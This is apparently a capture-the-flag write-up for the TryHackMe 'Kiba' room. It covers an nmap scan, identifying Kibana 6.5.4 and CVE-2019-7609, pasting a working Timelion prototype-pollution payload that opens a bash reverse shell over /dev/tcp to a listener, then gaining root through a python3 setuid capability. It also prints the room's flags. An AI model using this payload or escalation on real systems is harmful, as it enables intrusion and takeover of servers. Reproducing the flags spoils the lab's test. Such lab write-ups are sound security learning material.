# kiba

If we try to access kibana through browser by IP address, we won't get direct access. It will display this page :

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/0fa7feb7-4810-44fd-aa97-1530bbab484f)

So through http port we can't get access of kibana. Thus, we will look for open ports of provided IP.

Initiate nmap scan to the provided IP.

`sudo nmap -p- 10.10.174.118`

As we can see the open ports through nmap scan, `5601/tcp` is the `esmagent` of Enterprise Service Management.

Give `<ip>:port` to access kibana. (`10.10.174.118:5601`)

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/7a3aab02-518c-4720-8b2f-4c21bc3bb4fb)

### What is the vulnerability that is specific to programming languages with prototype-based inheritance?

    Prototype Pollution
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/9bc44c56-7662-4b81-8ed3-b32a5dabe88c)

### What is the version of visualization dashboard installed in the server?

    Ver 6.5.4
    
    In Kibana, go to Management tab 
    
    There we can see the Version : 6.5.4 mentioned.
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/1b1b4e75-ccb3-4044-b392-7ee831cad2fe)


### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

    CVE-2019-7609
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/9bc44c56-7662-4b81-8ed3-b32a5dabe88c)

### Compromise the machine and locate user.txt

        THM{1s_easy_pwn3d_k1bana_w1th_rce}
        
Copy this payload

    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i >& /dev/tcp/10.9.19.3/4444                      0>&1\'");//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

* Open `Timelion` in kibana and paste the payload in the provided box.
* Start a netcat listener

![03](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/f29fb475-b117-49b8-8935-655069cd21b0)

* Go to Canvas tab, we will get the response from reverse shell and we'll redirected to kiba directories.

![05](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/5a186195-a9a6-49bd-9959-75d39d9a0a3d)

### How would you recursively list all of these capabilities?

* By using command `getcap -r/`

![07](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/f19f99be-1e64-4d4b-9e46-f083a7edd1ee)


![08](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/369f7e22-497f-463e-b95d-03b3b87e09e3)

### Escalate privileges and obtain root.txt

* Traverse to ./hackmeplease/ directory
        
* Give command  `./python3 -c ‘import os; os.setuid(0); os.system(“/bin/sh”)’`

        THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
    
![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/d5f6f110-18c1-4147-872e-9cb106ea4c62)

![image](https://github.com/tousif13/TryHackMe_Writeups/assets/33444140/794d592b-9799-405f-b3dd-600ba5827818)
